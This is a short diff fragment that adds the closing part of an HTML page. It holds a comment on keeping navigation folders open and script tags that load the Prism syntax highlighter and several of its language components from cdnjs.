+            // 3. User Experience: Keep manually opened folders open? 
+            // Optional: for now, the "Active Link" logic is usually enough for navigation.
+            // If user wants manual persistence, we need IDs for every details element.
+        });
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-cpp.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+</body>
+</html>
